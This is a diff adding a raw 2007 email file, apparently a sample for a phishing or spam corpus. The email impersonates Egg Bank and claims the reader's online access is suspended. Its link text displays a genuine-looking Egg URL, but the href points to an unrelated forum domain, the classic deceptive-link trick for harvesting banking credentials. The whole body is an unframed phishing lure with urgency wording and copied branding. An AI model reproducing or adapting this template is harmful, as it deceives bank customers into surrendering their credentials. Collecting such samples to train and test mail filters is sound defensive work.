@@ -1,0 +1,124 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <php5.wswww11@livemail.nl>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id B88784697A
+ for <user@login.example.com>; Mon, 22 Jan 2007 09:55:59 -0500 (EST)
+X-Greylist: delayed 53 seconds by postgrey-1.27 at mail.example.org;
+ Mon, 22 Jan 2007 09:55:59 EST
+Received: from wsmail04.livemail.nl (wsmail04.livemail.nl [193.93.174.43])
+ by mail.example.org (Postfix) with ESMTP id 9F8DC131FB70
+ for <user@example.com>; Mon, 22 Jan 2007 09:55:59 -0500 (EST)
+Received: from wswww11 ([193.93.174.44]) by wsmail04.livemail.nl with
+ MailEnable ESMTP; Mon, 22 Jan 2007 15:55:04 +0100
+Date: Mon, 22 Jan 2007 15:55:02 +0100
+Subject: Online Bank Account Update!
+To: user@example.com
+From: Egg Bank Plc <Online Service@Egg.co.uk>
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+Content-Transfer-encoding: 8bit
+Reply-To: Egg Bank Plc <Online Service@Egg.co.uk>
+Message-ID: <f4088af67c68b7f3df8c690d6c361c22@>
+X-Priority: 1
+X-MSmail-Priority: High
+X-Mailer: Microsoft Office Outlook, Build 11.0.5510
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 659
+
+</head>
+
+<body lang=EN-US link=blue vlink=blue style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="100%"
+ style='width:100.0%;border-collapse:collapse' id=table1>
+ <tr style='mso-yfti-irow:0'>
+  <td style='padding:.75pt .75pt .75pt .75pt'>
+  <div>
+  <table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="100%"
+   style='width:100.0%;border-collapse:collapse' id=table1>
+   <tr style='mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+
+    <td width=10 style='width:.1in;padding:.75pt .75pt .75pt .75pt'>
+    <p class=MsoNormal align=right style='text-align:right'><img width=390
+    height=50 id="_x0000_i1025"
+    src="http://new.egg.com/com.egg/images/Masthead/masthead_ifyoudont_grassgreen.gif"></p>
+    </td>
+    <td style='padding:.75pt .75pt .75pt .75pt'>
+    <p align=right style='margin-bottom:12.0pt;text-align:right'><o:p> </o:p></p>
+    </td>
+   </tr>
+  </table>
+
+  </div>
+  <p class=MsoNormal><o:p></o:p></p>
+  </td>
+ </tr>
+ <tr style='mso-yfti-irow:1;mso-yfti-lastrow:yes;height:15.75pt'>
+  <td style='padding:.75pt .75pt .75pt .75pt;height:15.75pt'>
+  <table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="62%"
+   style='width:62.0%;border-collapse:collapse' id=table3>
+   <tr style='mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+    <td style='padding:.75pt .75pt .75pt .75pt'>
+
+    <p class=MsoNormal><span style='font-size:10.0pt;font-family:Georgia;
+    color:black'><br>
+    Dear Customer<span class=GramE>,</span><br>
+    <br>
+    Your access to Online Services has been suspended. Due to a <span
+    class=SpellE>mis</span>-match of access code between your Security
+    information. To enable you continue accessing your online account, it will
+    only take you few minutes to re-activate your account. <o:p></o:p></span></p>
+    <p class=MsoNormal><span style='font-size:10.0pt;font-family:Georgia;
+    color:black'><o:p> </o:p></span></p>
+    <p class=MsoNormal><span style='font-size:10.0pt;font-family:Georgia;
+    color:black'>Click on the guide-link below and follow the directions to
+    instant activation or please call our Online Helpdesk on 08451 232 <span
+    class=SpellE>232</span> to activate your account and security information. <o:p></o:p></span></p>
+
+    <p><b><span style='font-size:10.0pt;font-family:Arial;color:black'><a
+    href="http://www.blizzardwatch.ca/shilo_forum/Packages/temp/.me/Secure-egg-Update/Update-Required/security/customer/index.html">https://new.egg.com/security/customer/logon?youraccounts</a></span></b><span
+    style='font-size:10.0pt;font-family:Georgia;color:black'><o:p></o:p></span></p>
+    <p><span style='font-size:10.0pt;font-family:Georgia;color:black'><br>
+    Important Notice – You are strictly advised to match your Security details
+    rightly to avoid service suspension. <o:p></o:p></span></p>
+    <p style='margin-bottom:12.0pt'><span style='font-size:10.0pt;font-family:
+    Georgial;color:black'>Egg Online Helpdesk <br style='mso-special-character:
+    line-break'>
+    <![if !supportLineBreakNewLine]><br style='mso-special-character:line-break'>
+    <![endif]></span><span style='font-size:10.0pt;font-family:Georgia;
+    color:black'><o:p></o:p></span></p>
+    </td>
+
+   </tr>
+  </table>
+  <div class=MsoNormal align=center style='text-align:center'>
+  <hr size=1 width="100%" align=center>
+  </div>
+  <table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="100%"
+   style='width:100.0%;border-collapse:collapse' id=table1>
+   <tr style='mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+    <td style='padding:.75pt .75pt .75pt .75pt'>
+    <p class=MsoNormal><o:p> </o:p></p>
+
+    </td>
+   </tr>
+  </table>
+  <p class=MsoNormal><span style='font-size:7.5pt;font-family:Arial;color:gray'><o:p></o:p></span></p>
+  </td>
+ </tr>
+</table>
+
+<p class=MsoNormal><o:p> </o:p></p>
+
+</div>
+
+</body>
+
+</html>
